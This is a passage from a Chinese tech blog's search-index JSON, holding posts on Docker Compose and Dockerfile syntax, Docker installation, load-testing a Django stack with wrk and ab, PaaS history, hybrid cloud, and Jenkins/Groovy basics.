主机上对应变量的值，可以用来防止泄露不必要的数据。例如:\n1 2 3 environment: RACK_ENV: development SESSION_SECRET: 或者\n1 2 3 environment: - RACK_ENV=development - SESSION_SECRET 注意，如果变量名称或者值中用到 true|false，yes|no 等表达布尔含义的词汇，最好放到引号里，避免 YAML 自动解析某些内容为对应的布尔语义。\nhttp://yaml.org/type/bool.html 中给出了这些特定词汇，包括\n1 2 3 y|Y|yes|Yes|YES|n|N|no|No|NO |true|True|TRUE|false|False|FALSE |on|On|ON|off|Off|OFF 4.6 expose 暴露端口，但不映射到宿主机，只被连接的服务访问。仅可以指定内部端口为参数\n1 2 3 expose: - \u0026#34;3000\u0026#34; - \u0026#34;8000\u0026#34; 4.7 image 指定为镜像名称或镜像 ID。如果镜像在本地不存在，Compose 将会尝试拉取这个镜像。例如：\n1 2 3 image: ubuntu image: orchardup/postgresql image: a4bc65fd 4.8 links 链接到其它服务中的容器。使用服务名称（同时作为别名）或服务名称：服务别名 （SERVICE:ALIAS） 格式都可以。\n1 2 3 4 links: - db - db:database - redis 使用的别名将会自动在服务容器中的 /etc/hosts 里创建。例如：\n1 2 3 172.17.2.186 db 172.17.2.186 database 172.17.2.187 redis 被链接容器中相应的环境变量也将被创建。\n4.9 volumes 数据卷所挂载路径设置。可以设置宿主机路径 （HOST:CONTAINER） 或加上访问模式 （HOST:CONTAINER:ro）。该指令中路径支持相对路径。例如\n1 2 3 4 volumes: - /var/lib/mysql - cache/:/tmp/cache - ~/configs:/etc/configs/:ro 4.10 volumes_from 从另一个服务或容器挂载它的数据卷。\n1 2 3 volumes_from: - service_name - container_name 5. 参考 https://docs.docker.com/compose/compose-file/compose-versioning/#version-1 https://yeasy.gitbooks.io/docker_practice/content/compose/yaml_file.html ","description":"","id":503,"section":"post","tags":["博文","Docker","服务","工具","Django"],"title":"从零开始使用 Docker 打包 Django 开发环境 (3) Docker Compose","uri":"https://www.chenshaowen.com/blog/how-to-package-django-development-environments-using-docker-3.html"},{"content":"1. 基本概念 Dockerfile 是一些列构建 Docker 镜像的指令集合。Docker 通过读取 Dockerfile 指令自动构建镜像。Dockerfile 类似于 Makefile，都是一种文本文件，按照构建镜像顺序组织所有的指令。\nDocker 镜像的构建命令：\n1 docker build . 这条命令中，Docker CLI 的处理流程如下：\n把当前目录及子目录当做上下文传递给 Docker Daemon 从当前目录（不包括子目录）中找到 Dockerfile 文件 检查 Dockerfile 的语法 依次执行 Dockerfile 中的指令，根据指令生成中间过渡镜像（存储在本地，为之后的指令或构建作缓存） 2. Docker 文件组成 Dockerfile 一般包含下面几个部分：\n基础镜像，以哪个镜像作为基础进行制作，用法是 FROM 基础镜像名称 维护者信息，需要写下该 Dockerfile 编写人的姓名或邮箱，用法是MANITAINER 名字/邮箱 镜像操作命令，对基础镜像要进行的改造命令，比如安装新的软件，进行哪些特殊配置等，常见的是 RUN 命令 容器启动命令，当基于该镜像的容器启动时需要执行哪些命令，常见的是 CMD 命令或 ENTRYPOINT 命令 3. Dockerfile 命令 3.1 FROM 语法：FROM image[:tag]\n解释：设置要制作的镜像基于哪个镜像，FROM 指令必须是整个 Dockerfile 的第一个指令，如果指定的镜像不存在默认会自动从 Docker Hub 上下载。如果不指定 tag，默认是 latast。\n3.2 MAINTAINER 语法：MAINTAINER name\n解释：MAINTAINER 指令允许你给将要制作的镜像设置作者信息\n3.3 RUN 语法：\nRUN command #将会调用/bin/sh -c command RUN [\u0026ldquo;executable\u0026rdquo;, \u0026ldquo;param1\u0026rdquo;, \u0026ldquo;param2\u0026rdquo;] #将会调用exec执行，以避免有些时候shell方式执行时的传递参数问题，而且有些基础镜像可能不包含/bin/sh 解释：RUN指令会在一个新的容器中执行任何命令，然后把执行后的改变提交到当前镜像，提交后的镜像会被用于Dockerfile中定义的下一步操作，RUN中定义的命令会按顺序执行并提交，这正是Docker廉价的提交和可以基于镜像的任何一个历史点创建容器的好处，就像版本控制工具一样。\n3.4 CMD 语法：\nCMD [\u0026ldquo;executable\u0026rdquo;, \u0026ldquo;param1\u0026rdquo;, \u0026ldquo;param2\u0026rdquo;] #将会调用exec执行，首选方式 CMD [\u0026ldquo;param1\u0026rdquo;, \u0026ldquo;param2\u0026rdquo;] #当使用ENTRYPOINT指令时，为该指令传递默认参数 CMD command [ param1|param2 ] #将会调用/bin/sh -c执行 解释：CMD 指令中指定的命令会在镜像运行时执行，在 Dockerfile 中只能存在一个，如果使用了多个 CMD指令，则只有最后一个 CMD 指令有效。当出现 ENTRYPOINT 指令时，CMD 中定义的内容会作为 ENTRYPOINT 指令的默认参数，也就是说可以使用 CMD 指令给 ENTRYPOINT 传递参数。\n注意：RUN 和 CMD 都是执行命令，他们的差异在于 RUN 中定义的命令会在执行 docker build 命令创建镜像时执行，而 CMD 中定义的命令会在执行docker run命令运行镜像时执行，另外使用第一种语法也就是调用 exec 执行时，命令必须为绝对路径。\n3.5 EXPOSE 语法：EXPOSE port [ \u0026hellip;]\n解释：EXPOSE 指令用来告诉 Docker 这个容器在运行时会监听哪些端口，Docker 在连接不同的容器(使用–link参数)时使用这些信息。\n3.6 ENV 语法：ENV key value\n解释：ENV 指令用于设置环境变量，在 Dockerfile 中这些设置的环境变量也会影响到 RUN 指令，当运行生成的镜像时这些环境变量依然有效，如果需要在运行时更改这些环境变量可以在运行 docker run 时添加–env key=value参数来修改。\n注意：最好不要定义那些可能和系统预定义的环境变量冲突的名字，否则可能会产生意想不到的结果。\n3.7 ADD 语法：ADD src dest\n解释：ADD 指令用于从指定路径拷贝一个文件或目录到容器的指定路径中，是一个文件或目录的路径，也可以是一个 url，路径是相对于该 Dockerfile 文件所在位置的相对路径， 是目标容器的一个绝对路径，例如 /home/yooke/Docker/Dockerfile 这个文件中定义的，那么 ADD /data.txt /db/指令将会尝试拷贝文件从 /home/yooke/Docker/data.txt 到将要生成的容器的 /db/data.txt，且文件或目录的属组和属主分别为 uid 和 gid 为0的用户和组，如果是通过 url 方式获取的文件，则权限是600。\n注意：\n如果执行 docker build somefile 即通过标准输入来创建时，ADD 指令只支持 url 方式，另外如果 url 需要认证，则可以通过 RUN wget … 或 RUN curl … 来完成，ADD 指令不支持认证。 src 路径必须与 Dockerfile 在同级目录或子目录中，例如不能使用ADD ../somepath，因为在执行docker build时首先做的就是把 Dockerfile 所在目录包含子目录发送给 docker 的守护进程。 如果 src 是一个 url 且 dest 不是以 \u0026lsquo;/\u0026rsquo; 结尾，则会下载文件并重命名为 dest 。 如果 src 是一个 url 且 dest 以 \u0026lsquo;/\u0026rsquo; 结尾，则会下载文件到 dest filename，url 必须是一个正常的路径形式，\u0026lsquo;http://example.com\u0026rsquo; 像这样的 url 是不能正常工作的。 如果 src 是一个本地的压缩包且 dest 是以 \u0026lsquo;/\u0026rsquo; 结尾的目录，则会调用 \u0026rsquo;tar -x\u0026rsquo; 命令解压缩，如果 dest 有同名文件则覆盖，但 src 是一个 url 时不会执行解压缩。 3.8 COPY 语法：COPY src dest\n解释：用法与 ADD 相同，不过 src 不支持使用url，所以在使用 docker build somefile 时该指令不能使用。\n3.9 ENTRYPOINT 语法：\nENTRYPOINT [\u0026rsquo;executable\u0026rsquo;, \u0026lsquo;param1\u0026rsquo;, \u0026lsquo;param2\u0026rsquo;] #将会调用exec执行，首选方式 ENTRYPOINT command param1 param2 #将会调用/bin/sh -c执行 解释：ENTRYPOINT 指令中指定的命令会在镜像运行时执行，在 Dockerfile 中只能存在一个，如果使用了多个 ENTRYPOINT 指令，则只有最后一个指令有效。ENTRYPOINT 指令中指定的命令（exec执行的方式）可以通过 docker run 来传递参数，例如 docker run images -l 启动的容器将会把 -l 参数传递给 ENTRYPOINT 指令定义的命令并会覆盖 CMD 指令中定义的默认参数(如果有的话)，但不会覆盖该指令定义的参数，例如 ENTRYPOINT [\u0026rsquo;ls\u0026rsquo;,\u0026rsquo;-a\u0026rsquo;]，CMD [\u0026rsquo;/etc\u0026rsquo;]，当通过 docker run image 启动容器时该容器会运行 ls -a /etc 命令，当使用 docker run image -l 启动时该容器会运行 ls -a -l 命令，-l 参数会覆盖 CMD 指令中定义的/etc参数。\n注意：\n当使用 ENTRYPOINT 指令时生成的镜像运行时只会执行该指令指定的命令。 当出现 ENTRYPOINT 指令时 CMD 指令只可能（当 ENTRYPOINT 指令使用 exec 方式执行时）被当做 ENTRYPOINT 指令的参数使用，其他情况则会被忽略。 3.10 VOLUME 语法：VOLUME [\u0026lsquo;samepath\u0026rsquo;]\n解释：VOLUME 指令用来设置一个挂载点，可以用来让其他容器挂载以实现数据共享或对容器数据的备份、恢复或迁移。\n3.11 USER 语法：USER [username|uid]\n解释：USER指令用于设置用户或uid来运行生成的镜像和执行 RUN 指令。\n3.12 WORKDIR 语法：WORKDIR /path/to/workdir\n解释：WORKDIR 指令用于设置 Dockerfile 中的 RUN、CMD 和 ENTRYPOINT 指令执行命令的工作目录(默认为/目录)，该指令在 Dockerfile 文件中可以出现多次，如果使用相对路径则为相对于 WORKDIR 上一次的值，例如 WORKDIR /data，WORKDIR logs，RUN pwd 最终输出的当前目录是 /data/logs。\n4. 最佳实践 4.1 使用 .dockerignore 文件 在 docker 构建镜像的第一步，docker CLI 会先在上下文目录中寻找 .dockerignore 文件，根据 .dockerignore 文件排除上下文目录中的部分文件和目录，然后把剩下的文件和目录传递给 docker 服务。.dockerignore 语法同 .gitignore。\n4.2 避免安装不必要的包 为了减小复杂度、依赖、文件大小和创建的时间，应该避免安装额外或者不必要的包。例如，我们不必在一个数据库镜像中包含一个文本编辑器。\n4.3 对于多行参数要做字典序排序 只要有可能，通过对多行参数进行字母数字排序来缓解后续变更。这将帮助你避免重复的包并且更容易更新。在反斜线( \\ )前添加一个空格是个好习惯。\n1 2 3 RUN apt-get update \u0026amp;\u0026amp; apt-get install -y \\ bzr \\ cvs 4.4 尽量利用 build 镜像的缓存 在创建镜像过程中，Docker 将按照 Dockerfile 指定步骤执行每个指令。\n一般情况下，对于每条命令，docker 都会生成一层镜像。如果在构建某个镜像层的时候，发现这个镜像层已经存在了，就直接使用，而不是重新构建。\n大部分指令是通过与缓存进行对比该指令、执行指令的基础镜像，判断是否使用缓存。除了 ADD 和 COPY，这两个指令会复制文件内容到镜像内，docker 还会检查每个文件内容校验和(不包括最后修改时间和最后访问时间)，如果校验和不一致，则不会使用缓存。\n4.5 每个镜像只有一个功能 不要在容器里运行多个不同功能的进程，每个镜像中只安装一个应用的软件包和文件，需要交互的程序通过 pod（kubernetes 提供的特性） 或者容器之间的网络进行通信。这样可以保证模块化，不同的应用可以分开维护和升级，也能减小单个镜像的大小。\n4.6 不要在构建中升级版本 更新将发生在基础镜像里，不要在你的容器内来apt-get upgrade更新。因为在隔离情况下，如果更新时试图修改 init 或改变容器内的设备，更新可能会经常失败。它还可能会产生不一致的镜像，因为你不再有你的应用程序该如何运行以及包含在镜像中依赖的哪种版本的正确源文件。\n5. 参考 https://hujb2000.gitbooks.io/docker-flow-evolution/content/cn/basis/dockerfiledetail.html http://www.zioer.org/2016/05/29/docker-engine-Best-practices-Dockerfiles/ http://cizixs.com/2017/03/28/dockerfile-best-practice http://cizixs.com/2016/04/06/docker-images ","description":"","id":504,"section":"post","tags":["博文","Docker","服务","工具","Django"],"title":"从零开始使用 Docker 打包 Django 开发环境 (2) Dockerfile","uri":"https://www.chenshaowen.com/blog/how-to-package-django-development-environments-using-docker-2.html"},{"content":" Vagrant 适合用来管理虚拟机，而 Docker 适合用来管理应用环境。为了更好地模拟真实运行环境，本系列文章借助 Docker 和 Docker Compose 搭建 Nginx + uWSGI+ Django + MySQL + Redis + Rabbit 的开发环境。\n1. 基本概念 Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。Docker 可以让开发者打包应用以及依赖包到一个轻量级、可移植的容器中，然后发布到机器上。\nDocker Compose 是一个用来定义和运行复杂应用的 Docker 工具。\n2. Docker 安装和使用 2.1 安装 在 Linux 上 安装 Docker。\n1 curl -sSL https://get.daocloud.io/docker | sh 在 Linux 上 安装 Docker Compose。\n1 2 curl -L https://get.daocloud.io/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` \u0026gt; /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose 2.2 查看安装信息 安装完毕后，可以通过如下命令检测是否安装成功。\n查看 Docker 版本\n1 2 docker --version Docker version 1.12.6, build 88a4867/1.12.6 查看 docker-compose 版本\n1 2 docker-compose --version docker-compose version 1.16.1, build 6d1ac21 拉起 Docker Deamon。Docker Client 需要将 Console 输入的命令，发送给 Daemon 执行。\n1 service docker start 通过，docker info 命令可以看到，本地使用的是 docker 原生的镜像源。\n1 2 3 4 5 6 7 8 docker info // 查看 docker 信息 Docker Root Dir: /var/lib/docker Debug Mode (client): false Debug Mode (server): false Registry: https://index.docker.io/v1/ Insecure Registries: 127.0.0.0/8 Registries: docker.io (secure) 2.3 拉取、启动镜像 拉取 hello-world 镜像。\n1 2 3 4 5 6 docker pull hello-world Using default tag: latest Trying to pull repository docker.io/library/hello-world ... latest: Pulling from docker.io/library/hello-world Digest: sha256:f3b3b28a45160805bb16542c9531888519430e9e6d6ffc09d72261b0d26ff74f 启动 hello-world 镜像。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 docker run hello-world Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \u0026#34;hello-world\u0026#34; image from the Docker Hub. 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://cloud.docker.com/ For more examples and ideas, visit: https://docs.docker.com/engine/userguide/ 查看本地镜像列表。\n1 2 3 docker images REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/hello-world latest 1815c82652c0 12 weeks ago 1.84 kB 2.4 配置加速器（可选） 使用 Docker 的时候，经常需要从官方获取镜像，但是由于网络原因，拉取镜像的过程非常耗时，严重影响使用 Docker 的体验。\n这里使用的 DaoDlcoud 提供的加速器，通过智能路由和缓存机制，提升了访问 Docker Hub 的速度。\n1 curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://6c5fbccc.m.daocloud.io 3. 参考 http://www.linuxidc.com/Linux/2015-07/119961.htm https://yeasy.gitbooks.io/docker_practice/ https://zh.wikipedia.org/zh-cn/Docker_(%E8%BB%9F%E9%AB%94) ","description":"","id":505,"section":"post","tags":["博文","Docker","服务","工具","Django"],"title":"从零开始使用 Docker 打包 Django 开发环境 (1) 环境搭建","uri":"https://www.chenshaowen.com/blog/how-to-package-django-development-environments-using-docker-1.html"},{"content":"1. 网站性能基础指标 并发数： 服务器单位时间内处理的会话数量 吞吐率： 服务器单位时间内处理的请求数 响应时间： 用户从发出请求到接受完响应之间的总耗时，由网络传输耗时、服务处理耗时等多个部分组成 平均响应时间： 所有请求响应时间的平均值 2. 测试工具 性能测试有两个层次，一个是单接口的压力测试，一个是生产环境模拟用户操作的压力测试。前者可以通过工具对 CGI 自动化压测，后者通常需要根据业务逻辑定制化测试。\n主要的免费压力测试工具有，apache ab、webench、wrk、Gatling、sniper、hey、Siege、http_load、vegeta、t50、GoReplay、tcpcopy、gryphon、locust.io、Jmeter。下面描述其中若干的用法。\n2.1 ab ab 全称为：apache bench\n命令格式： ab [options] [http://]hostname[:port]/path\n主要参数：\n1 2 -n，总共请求数 -c ，并发数 例如，以每秒 50 的并发，产生 1000 个请求。\n1 ab -c 50 -n 1000 http://127.0.0.1/ 2.2 http_load http_load 测试前需要将测试的 url 写入文件，把文件作为参数传递给 http_load。\n命令格式：http_load [-checksum] [-throttle] [-proxy host:port] [-verbose] [-timeout secs] [-sip sip_file] -parallel N | -rate N [-jitter] -fetches N | -seconds N url_file\n主要参数：\n```bash`\n-parallel ，并发数\n-fetches，总共请求数\n例如，以每秒 50 的并发，产生 1000 个请求。 ```bash # http_load -parallel 50 -fetches 1000 url.txt 2.3 webbench、siege webbench 不支持指定总访问数，支持并发数和测试时长，不直接支持 https 测试。\n命令格式：webbench [option]\u0026hellip; URL\n主要参数：\n1 2 -c，并发数 -t，测试持续时间 例如，以每秒 50 的并发，持续测试 20 秒\n1 webbench -c 50 -t 20 http://127.0.0.1/ siege 的参数和命令格式与 webbench 类似。\n1 siege -c 50 -t 20 http://127.0.0.1/ 2.4 wrk wrk 使用了一些操作系统特定的高性能 io 机制, 比如 select, epoll, kqueue 等，能用很少的线程压测出很大的并发量。\n命令格式：wrk 主要参数：\n1 2 3 4 5 6 7 -c，跟服务器建立并保持的连接数量 -d，压测时间 -t，使用多少个线程进行压测 -s，指定 Lua 脚本路径 -H，为每一个 HTTP 请求添加HTTP头 --latency，在压测结束后，打印延迟统计信息 --timeout，超时时间 例如，开启 10 个线程，每秒 100 的并发，持续 30秒进行压测。\n1 wrk -t10 -c100 -d30s http://127.0.0.1 相比较于 其他工具 wrk 可以使用 lua 脚本来压测更加复杂的场景。比如，需要测试 POST 请求，只需要准备一个 lua 脚本。\npost.lua\n1 2 3 wrk.method = \u0026#34;POST\u0026#34; wrk.headers[\u0026#34;Content-Type\u0026#34;] = \u0026#34;application/x-www-form-urlencoded\u0026#34; wrk.body = \u0026#34;key1=val1\u0026amp;key2=val2 \u0026#34; 使用 -s 参数\n1 wrk -t10 -c100 -d30s -s post.lua http://127.0.0.1 3. 测试 Demo Django 应用的部署架构，采用一个 Nginx 容器作为反向代理，后台通过 uSWGI 转发请求给 Django，Django 访问 MySQL、Redis 等服务，沿原链路返回响应。\n硬件配置：笔记本intel i5-5300 2.3GHz，8GB 内存，SAMSUNG 固态硬盘\n软件配置： CentOS 7.2，Nginx 2 个 work，uWSGI 8 个 work，无 gevent。\n下面是一个简单的单次测试试验：\n无 DB 访问:\n1 2 3 4 5 6 7 8 9 10 11 wrk -t10 -c10000 -d10 \u0026#39;http://127.0.0.1\u0026#39; Running 10s test @ http://127.0.0.1 10 threads and 10000 connections Thread Stats Avg Stdev Max +/- Stdev Latency 176.93ms 334.40ms 1.99s 90.73% Req/Sec 322.89 162.38 840.00 67.78% 18351 requests in 10.06s, 7.70MB read Socket errors: connect 8989, read 56, write 0, timeout 549 Requests/sec: 1824.76 Transfer/sec: 784.08KB 有 DB 访问：\n1 2 3 4 5 6 7 8 9 10 11 wrk -t10 -c10000 -d10 \u0026#39;http://127.0.0.1/books_fbv/\u0026#39; Running 10s test @ http://127.0.0.1/books_fbv/ 10 threads and 10000 connections Thread Stats Avg Stdev Max +/- Stdev Latency 393.67ms 274.98ms 1.99s 92.02% Req/Sec 69.44 70.51 360.00 82.23% 3623 requests in 10.05s, 2.27MB read Socket errors: connect 8989, read 102, write 0, timeout 179 Requests/sec: 360.40 Transfer/sec: 231.58KB Nginx 转发静态文件：\n1 2 3 4 5 6 7 8 9 10 11 wrk -t10 -c10000 -d10 \u0026#39;http://127.0.0.1/static/index.html\u0026#39; Running 10s test @ http://127.0.0.1/static/index.html 10 threads and 10000 connections Thread Stats Avg Stdev Max +/- Stdev Latency 26.33ms 54.99ms 1.34s 99.19% Req/Sec 4.84k 3.39k 10.72k 50.58% 371148 requests in 10.08s, 89.54MB read Socket errors: connect 8989, read 0, write 0, timeout 19 Requests/sec: 36809.92 Transfer/sec: 8.88MB Django 转发静态文件：\n1 2 3 4 5 6 7 8 9 10 11 12 wrk -t10 -c10000 -d10 \u0026#39;http://127.0.0.1/static/index.html\u0026#39; Running 10s test @ http://127.0.0.1/static/index.html 10 threads and 10000 connections Thread Stats Avg Stdev Max +/- Stdev Latency 268.50ms 282.75ms 1.99s 92.15% Req/Sec 120.43 107.12 414.00 53.24% 6184 requests in 10.06s, 15.33MB read Socket errors: connect 8989, read 301, write 0, timeout 264 Non-2xx or 3xx responses: 6184 Requests/sec: 615.00 Transfer/sec: 1.52MB 4. 参考 http://66note.com/wp/79 ","description":"","id":506,"section":"post","tags":["博文","测试","Demo","Docker","Django"],"title":"基于 Docker 的 Django 应用性能测试","uri":"https://www.chenshaowen.com/blog/django-application-performance-test-based-on-docker.html"},{"content":" 服务商 域名 谷歌 Google App Engine appspot.com 二级域名 新浪 Sina App Engine sinaapp.com 二级域名 百度 Baidu App Engine duapp.com 二级域名 Heroku herokuapp.com 二级域名 AWS Elastic Beanstalk elasticbeanstalk.com 二级域名 OpenShift rhcloud.com 二级域名 DaoCloud daocloud.io 二级域名 时速云 TenxCloud tenxapp.com 二级域名 灵雀云 Alauda myalauda.cn 二级域名 ","description":"","id":507,"section":"post","tags":["博文","域名","服务","PaaS"],"title":"PaaS  平台提供的免费 APP 域名服务","uri":"https://www.chenshaowen.com/blog/free-app-domain-name-service-of-paas-platform.html"},{"content":"1. 关于 PaaS 1.1 什么是 PaaS PaaS 是平台即服务（Platform as a Service）的简称，平台即服务是一种云计算服务，提供运算平台与解决方案服务。PaaS 的出现加快了 SaaS 的发展，尤其是加快了 SaaS 应用的开发速度。比如，SaaS 开发时，使用 PaaS 平台统一提供的登录、数据库、缓存等服务，将大大减少这些服务开发的人力和成本。同时将，SaaS 应用的运维交给了 PaaS 平台完成。\n1.2 PaaS 的特点 PaaS 平台提供的是针对开发人员的 SaaS 服务。通过 PaaS 平台将一些常用的服务，提取为公共服务，比如扩缩容、数据库、发布等。开发人员只需要专注于业务，基于 PaaS 平台提供的开发框架完成业务逻辑的填充。\nPaaS 平台的特点有：\n提供开发框架\nPaaS 平台提供开发框架，开发人员在其基础上开发 SaaS 应用。开发框架是应用与 PaaS 平台融合的关键。 减少编码时间\nPaaS 平台通过提供内置的预编码应用组件（如工作流、目录服务、安全功能、搜索等），可以大幅度削减编码新应用所需的时间。 大量公共服务\nPaaS 平台通常会提供大量的公共服务。比如，短信发送、COS 对象存储、Redis等。这些服务加快了开发进程，同时，后期也不用维护，易于扩容。 跨平台支持\nPaaS 平台提供商通常会提供针对多种平台（例如PC端、移动端）的开发选项，允许更快速、更轻松地开发跨平台应用。 有效管理应用程序生命周期\nPaaS 平台提供了支持 Web 应用程序完整的生命周期（生成、测试、部署、管理和更新）所需的全部功能。 免运维\nPaaS 平台提供了整体的开发流程、自动化部署方案。应用开发阶段、上线后，都不需要运维人员过多参与。 2. PaaS 1.0 以谷歌 GAE、Heroku、SAE为代表的是 PaaS 1.0 时代，采用了比虚拟化更加细粒度的应用作为服务单元，但它存在的致命问题是对应用程序的侵入性，也就是说要求开发者对程序代码进行限制，以满足平台的运行需求。\nPaaS 1.0 对开发语言有很多限制，应用托管环境单一、组件封闭，开发者不希望使用某个 PaaS 引擎就将自己锁定在这个平台上面。这限制了 PaaS 1.0 的发展。\n3. PaaS 2.0 以 Cloud Foundry 和 OpenShift 为代表的是 PaaS 2.0 时代。它的进步性体现在，基本上消除了对应用程序的侵入性，但是对 DevOps 本身的环境变量的传递和部署仍有要求。\nPaaS 2.0 虽然能解决的需求已经很多了，但是问题同样不少，比如 PaaS 2.0 并不介入软件的开发流程，软件开发完毕后，需要经过二次封装，才可以运行在 PaaS 平台之上。\n4. PaaS 3.0 以基于 Docker 的 Flynn、Deis 为代表的是 PaaS 3.0 时代。PaaS 3.0 涉足到软件开发流程，交付的产品就是 Docker 的标准镜像，在 Docker 的平台上把开发、测试、运维的流程打通。目前 PaaS 的发展，就处于 PaaS 3.0 阶段。国内也有大量平台公司提供 Docker 容器服务，比如，DaoCloud、时速云、数人云等。\n5. PaaS 4.0 以 AI 技术为代表的是 PaaS 4.0 时代。发展到 PaaS 3.0， 解决的是软件的开发、交付、部署问题，实现了 DevOps。这一过程节省了开发运维成本，加快了软件的交付流程。以前1个月开发1个应用，现在1个月可以开发5个应用；以前1个应用需要2个开发1个运维，现在需要1个 DevOps。有收益，但，是个加法运算。商业价值没有得到有效的挖掘和放大。AI 等数据挖掘技术在 PaaS 4.0 时代将大放异彩，PaaS 平台提供的数据处理能力，将极大地降低数据挖掘的门槛。同时，由于 PaaS 平台的规模效应，数据挖掘的成本优势得以体现。承载了大量业务数据的 PaaS 平台，也增强了用户对平台的粘性。\n","description":"","id":508,"section":"post","tags":["博文","思考","云服务","PaaS","容器","AI"],"title":"Container 和 AI 是 PaaS 未来的发展方向","uri":"https://www.chenshaowen.com/blog/container-and-ai-are-the-future-directions-in-the-development-of-paas.html"},{"content":"1. 混合云使用的用户场景 1.1 满足业务的爆发式增长 互联网业务呈指数型增长，很难预测基础设施的储备量。一般在业务成长初期很长一段时间，小规模的物理机托管就能满足业务需求。但是，随着市场的展开，业务规模爆发式增长，原有的物理机托管机房机位有限，只能通过公有云作为弹性手段，快速部署扩展，以满足业务需求。\n这类用户为了节省时间，多数通过 IPsec VPN 快速建立连接顶住流量，专线到位后再切换到专线提供可靠的混合云连接。在充分感知公有云的稳定和低成本后，大部分这类用户在原有的物理机托管机房到期后，会全量迁移到公有云。\n1.2 实现多地容灾的高可用架构部署 这类用户通常已经具有很大规模，他们考虑的核心问题是稳定性、可靠性。寻求从单中心向多中心化发展，通过消灭单点，解决单数据中心故障带来的业务风险。\n一般多地容灾常见的采用方式有同城容灾、异地双活、两地三中心等。图中，本地数据中心和公有云异地部署，数据库通过专线或进行主从互备，单中心失效，通过将流量切换至有效中心，提供有损但不中断的基础业务服务；当然对于金融等高可靠、高要求可以可以通过两地方式实现无损的容灾服务。\n1.3 监管要求下的混合云部署 这类用户通常为银行、金融、保险等行业用户，需要监管合规。普通的公有云服务基础设施难以满足金融合规的要求，倾向于将系统的 Web 层、业务行情、企业 OA 等放在公有云，将快速部署、交易、流水等核心问题放在合规的机房内。\n2 混合云技术难点 2.1 公有云上自定义网络的能力 这里自定义网络泛指私有网络（VPC）一类，可以用户自定义逻辑隔离的专用网络的能力，包括用户可以自行划分子网、配置路由，设置公网、网关等基础能力。\n2.2 多样、稳定的网络接入能力 混合云最突出的特点就是连接，连接方式主要分为两种：公网接入和专线接入。\n为保护用户的信息安全，公网接入在 Internet 上的流量需要经过 IPsecVPN 加密，一般小型网关（200Mbps以下）可以通过虚拟软件网关实现，中到大型网关（300Mbps及以上）可通过硬件网关设备实现。公网接入速度很快，一般半天即可完成部署使用，可以快速满足客户需求。鉴于国内网络环境复杂，部分网络拓扑拥塞会导致网络延迟、丢包率增加，不建议企业采用大于 200Mbps VPN 接入；但也有异常情况，比如用户数据中心侧不满足拉专线的条件，只能勉强用大容量提供服务。\n专线接入则在全时段全方位的保障了用户数据加密和可用带宽，用户无需担心容量太大无法承载的问题，但是专线接入周期长、价格较高。\n2.3 安全与监控 混合云在网络层面上将私有云和公有云进行了连接，如果发生网络故障或者攻击，服务商需要有能力保障网络间故障不会相互影响，将攻击或者故障限制在一定范围之内。\n2.4 完善的 API 管理支持 规模化的混合云部署后，用户可以通过 API 的方式，在原有本地数据中心的运维管理系统基础上，快速搭建兼容公有云的运维管理系统。这块公有云厂商只需要提供原子化的 API 即可，方便用户利用这些模块搭建弹性扩缩容系统、制定网络备份方案等。\n3. 公有云、私有云、混合云比较 混合云利用了公有云的自动快速弹性能力，也利用了私有云对敏感业务的高度控制，在安全、成本、服务能力三者方面均有不错的表现。\n3.1 公有云优势 成本更低 — 无需购买硬件或软件，仅对使用的服务付费。 无需维护 — 维护由服务提供商提供。 近乎无限制的缩放性 — 提供按需资源，可满足业务需求。 高可靠性 — 具备众多服务器，确保免受故障影响。 3.2 私有云优势 灵活性更高 — 组织可自定义云环境以满足特定业务需求。 安全性更高 — 资源不与其他组织共享，从而可实现更高控制性和安全性级别。 缩放性更高 — 私有云仍然具有公有云的缩放性和效率。 3.3 混合云优势 控制性 — 组织可针对敏感资产维持私有基础结构。 灵活性 — 需要时可利用公有云中的其他资源。 成本效益 — 具备扩展至公有云的能力，因此可仅在需要时支付额外的计算能力。 容易轻松 — 无需费时费力即可转换至云，因为可根据时间按工作负荷逐步迁移。 ","description":"","id":509,"section":"post","tags":["云","PaaS","云服务","整理","混合云"],"title":"云部署之混合云","uri":"https://www.chenshaowen.com/blog/hybrid-cloud-of-cloud-deployment.html"},{"content":"1. 基本概念 master master 就是 Jenkins 安装和运行的地方，它负责解析 job 脚本，处理任务，调度计算资源。\nagent agent 负责处理从 master 分发的任务，操作实际上是通过 executor 来执行的。\nexecutor executor 就是执行任务的计算资源，它可以在 master 或者 agent 上运行。多个 executor 也可以合作执行一些任务。\nstep Jenkins 里面 job 中的最小单元，可以认为是一个脚本的调用和一个插件的调用。\nnode node 可以给定参数来选择 agent，node 里的 step 将会运行在 node 选择的 agent 上。\nstage stage 是 pipeline 里 Groovy 里引入的一个虚拟概念，是一些 step 的集合。通过 stage ，可以将 job 的全部 step 划分为不同的 stage，使得整个 job 像管道一样容易维护。\n2. Groovy Groovy 是一门动态语言，支持在 Java 平台上进行 Java 编程，使用方式基本与使用 Java 代码的方式相同。用 groovyc 编译 Groovy 代码会产生标准的 Java 字节码，然后可以通过 java 命令可以运行生成的字节码。Groovy 就是 Java，只是缺少了过去使用的许多语法规则。Groovy 是没有类型、没有修改符、没有 return、没有 Iterator、不需要导入集合的 Java。简而言之，Groovy 就是丢掉了许多包袱的 Java。\n关于 Grails，就像 Rails 与 Ruby 编程语言联系非常紧密一样，Grails 是一套用于快速 Web 应用开发的开源框架。\n2.1 本地开发环境 Groovy 的开发环境配置与 Java 类似。首先去，http://groovy-lang.org ，下载 SDK 包。解压之后，配置环境变量。\n1 2 3 4 # 新增系统环境变量 GROOVY_HOME = D:\\Groovy\\groovy-2.4.12 # 在 Path 中新增 ;%GROOVY_HOME%\\bin; 在 command 中，输入：groovy -v。如果能显示出版本信息，说明配置成功。Groovy SDK 中提供了一个简易的编辑器，通过输入：groovyconsole，可以打开，输入：Ctrl + Enter 